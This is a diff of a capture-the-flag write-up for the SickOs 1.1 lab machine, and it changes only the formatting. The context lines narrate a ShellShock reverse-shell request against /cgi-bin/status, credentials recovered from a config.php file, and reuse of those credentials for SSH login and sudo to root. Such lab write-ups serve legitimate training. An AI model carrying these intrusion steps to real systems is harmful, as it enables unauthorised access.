@@ -1,5 +1,5 @@
 *SickOs 1.1*narrative
-    This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. This vm is very similar to labs I faced in OSCP. The objective being to compromise the network/machine and gain Administrative/root privileges on them. https://www.vulnhub.com/entry/sickos-11,132/
+    This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. This vm is very similar to labs I faced in OSCP. The objective being to compromise the network/machine and gain Administrative/root privileges on them. **https://www.vulnhub.com/entry/sickos-11,132/**
 
 
 Level 1.1
@@ -82,7 +82,7 @@ print "You may want to try my services"*
     *http://127.0.0.1/server-status/
 http://127.0.0.1//cgi-bin/status*
 
-    The most interesting one is */cgi-bin/status* which is known for applications vulnerable to ShellShock. In the end I manage to get a reverse shell with the following payload:
+    The most interesting one is **/cgi-bin/status** which is known for applications vulnerable to ShellShock. In the end I manage to get a reverse shell with the following payload:
 
     *GET http://127.0.0.1/cgi-bin/status HTTP/1.1
 Host: 1127.0.0.1
@@ -100,14 +100,14 @@ www-data@SickOs:/usr/lib/cgi-bin$ id
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)*
 
-    The kernel is outdated. I try a couple of local exploits but there are many gcc dependencies missing. Probably it is not the right root, I keep looking though the filesystem for unusual files, binaries with SUID bit and finally in the root of the CMS there is the *config.php* file with the following:
+    The kernel is outdated. I try a couple of local exploits but there are many gcc dependencies missing. Probably it is not the right root, I keep looking though the filesystem for unusual files, binaries with SUID bit and finally in the root of the CMS there is the **config.php** file with the following:
     *define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
 define('DB_USER', 'root');
 define('DB_PASS', 'john@123');*
 
     I try logging in through SSH as root, running sudo and su, no luck.
 
-    I connect to the database but there is nothing useful there. I look in home folders, nothing. After a few attempts I find out there is a user in */etc/passwd* called *sickos*. I try the previous credentials and get a shell. Sickos is in the sudoers group, so I can just sudo with the same password.
+    I connect to the database but there is nothing useful there. I look in home folders, nothing. After a few attempts I find out there is a user in **/etc/passwd** called **sickos**. I try the previous credentials and get a shell. Sickos is in the sudoers group, so I can just sudo with the same password.
     *root@kali:/# ssh sickos@192.168.252.133
 sickos@192.168.252.133's password:
 Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)
